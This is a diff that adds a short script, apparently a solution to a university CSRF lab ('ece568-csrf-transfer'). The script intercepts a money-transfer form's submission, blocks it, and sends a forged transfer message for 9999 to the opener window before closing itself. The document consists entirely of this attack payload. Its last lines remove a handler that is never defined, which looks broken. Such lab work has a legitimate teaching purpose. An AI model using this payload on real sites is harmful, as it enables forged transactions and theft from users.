@@ -1,0 +1,15 @@
+<script>
+    var transfer_form = document.getElementsByName("ece568-csrf-transfer")
+
+    transfer_form[0].addEventListener("submit", (event) => {
+        event.preventDefault();
+        window.opener.postMessage({
+            name: 'guest',
+            note: 'Hello World!',
+            amount: 9999,
+        }, window.location.origin);
+        window.close();
+    })
+    transfer_form[0].removeEventListener("message", sendMessagetoParent); 
+    transfer_form[1].removeEventListener("message", sendMessagetoParent); 
+</script>
